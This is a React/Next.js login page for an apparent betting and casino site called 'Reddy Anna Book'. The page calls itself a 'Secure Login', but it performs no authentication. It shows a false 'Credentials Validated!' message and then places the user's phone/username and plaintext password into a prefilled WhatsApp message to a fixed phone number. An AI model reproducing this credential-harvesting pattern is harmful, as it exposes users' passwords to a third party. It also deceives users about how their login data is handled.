"use client";

import React, { useState } from "react";
import Link from "next/link";
import Header from "../../components/Header";
import Footer from "../../components/Footer";
import FloatingWhatsApp from "../../components/FloatingWhatsApp";

export default function LoginPage() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    // Simple validation
    if (!phone || phone.trim() === "") {
      setError("Please enter your Phone Number or Username.");
      return;
    }

    if (phone.length < 5) {
      setError("Username or Phone must be at least 5 characters.");
      return;
    }

    if (!password || password.length < 6) {
      setError("Password must be at least 6 characters.");
      return;
    }

    // Success action
    setSuccess(true);
    
    // Redirect to WhatsApp with prefilled message
    setTimeout(() => {
      const message = encodeURIComponent(
        `Hello Reddy Anna Book, I want to login to my account.\nPhone/Username: ${phone}\nPassword: ${password}`
      );
      window.open(`https://wa.me/916026703858?text=${message}`, "_blank");
      setSuccess(false);
    }, 1200);
  };

  return (
    <>
      <Header />

      <main className="flex-grow bg-[#0f0f10] min-h-[calc(100vh-75px-360px)] py-16 px-4 flex items-center justify-center relative overflow-hidden font-sans">
        {/* Abstract background highlights */}
        <div className="absolute top-1/4 left-1/4 w-[300px] h-[300px] bg-ra-crimson/10 rounded-full blur-[100px] pointer-events-none" />
        <div className="absolute bottom-1/4 right-1/4 w-[250px] h-[250px] bg-ra-gold/5 rounded-full blur-[100px] pointer-events-none" />

        <div className="w-full max-w-[420px] bg-[#191919] border border-white/10 rounded-2xl shadow-2xl p-8 relative z-10 flex flex-col gap-6">
          
          {/* Logo & Header */}
          <div className="flex flex-col items-center text-center gap-2">
            <Link href="/" className="mb-2">
              <img
                src="https://reddysports.co/wp-content/uploads/2025/11/reddybook-logo.webp"
                alt="Reddybook Logo"
                className="h-[45px] w-auto"
              />
            </Link>
            <h1 className="text-white font-rajdhani font-bold text-[24px] tracking-wider uppercase">
              Ready Anna Login
            </h1>
            <p className="text-gray-400 text-[13.5px]">
              Access your premium sports betting and casino dashboard securely.
            </p>
          </div>

          {/* Form */}
          <form onSubmit={handleLogin} className="flex flex-col gap-5">
            
            {/* Phone/Username Input */}
            <div className="flex flex-col gap-1.5">
              <label htmlFor="phone" className="text-gray-300 text-[13px] font-bold uppercase tracking-wider">
                Phone Number / Username
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-[16px]">👤</span>
                <input
                  id="phone"
                  type="text"
                  placeholder="Enter Phone or Username"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full bg-black/40 border border-white/10 focus:border-ra-gold rounded-lg py-3 pl-11 pr-4 text-white text-[14px] placeholder-gray-500 outline-none transition-all"
                  required
                />
              </div>
            </div>

            {/* Password Input */}
            <div className="flex flex-col gap-1.5">
              <div className="flex justify-between items-center">
                <label htmlFor="password" className="text-gray-300 text-[13px] font-bold uppercase tracking-wider">
                  Password
                </label>
                <a
                  href="https://wa.me/916026703858?text=Hello,%20I%20forgot%20my%20Reddy%20Anna%20Login%20Password.%20Please%20help%20me%20reset%20it."
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-ra-gold hover:underline text-[12px] font-bold tracking-wide"
                >
                  Forgot Password?
                </a>
              </div>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-[16px]">🔒</span>
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Enter Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-black/40 border border-white/10 focus:border-ra-gold rounded-lg py-3 pl-11 pr-12 text-white text-[14px] placeholder-gray-500 outline-none transition-all"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white text-[14px] focus:outline-none"
                >
                  {showPassword ? "🙈" : "👁️"}
                </button>
              </div>
            </div>

            {/* Error Message */}
            {error && (
              <div className="bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg p-3 text-[13px] font-semibold flex items-center gap-2">
                <span>⚠️</span> {error}
              </div>
            )}

            {/* Success Message */}
            {success && (
              <div className="bg-[#25d366]/10 border border-[#25d366]/30 text-[#25d366] rounded-lg p-3 text-[13px] font-semibold flex flex-col gap-1 items-center justify-center text-center">
                <span className="text-[18px]">✅ Credentials Validated!</span>
                <span className="text-[11.5px] opacity-80">Connecting to WhatsApp support to retrieve your Live Session ID...</span>
              </div>
            )}

            {/* Action Buttons */}
            <div className="flex flex-col gap-3 mt-2">
              <button
                type="submit"
                disabled={success}
                className="w-full py-3.5 bg-gradient-to-r from-ra-gold to-ra-gold-dark hover:from-white hover:to-white hover:text-ra-crimson text-black font-extrabold rounded-lg shadow-[0_4px_15px_rgba(255,204,0,0.15)] hover:shadow-none transition-all duration-300 uppercase tracking-widest text-[14px] flex items-center justify-center gap-2"
              >
                <span>🔑</span> Secure Login
              </button>
              
              <div className="flex items-center my-1 text-gray-500 text-[12px] uppercase font-bold text-center justify-center before:content-[''] before:flex-grow before:border-b before:border-white/5 before:mr-3 after:content-[''] after:flex-grow after:border-b after:border-white/5 after:ml-3">
                Or login instantly via
              </div>

              <a
                href="https://wa.me/916026703858?text=Hello%20Reddy%20Anna%20Book,%20I%20want%20to%20login%20to%20my%20account%20instantly."
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-3 bg-[#25D366] hover:bg-[#20ba5a] text-white font-extrabold rounded-lg shadow-md transition-all uppercase tracking-widest text-[13px] flex items-center justify-center gap-2"
              >
                <span>💬</span> Login with WhatsApp
              </a>
            </div>

          </form>

          {/* Footer Navigation */}
          <div className="border-t border-white/5 pt-4 text-center">
            <p className="text-gray-400 text-[13.5px]">
              Don&apos;t have a Reddy Anna ID?{" "}
              <Link href="/signup" className="text-ra-gold hover:underline font-bold">
                Register Now
              </Link>
            </p>
          </div>

        </div>
      </main>

      <Footer />
      <FloatingWhatsApp />
    </>
  );
}
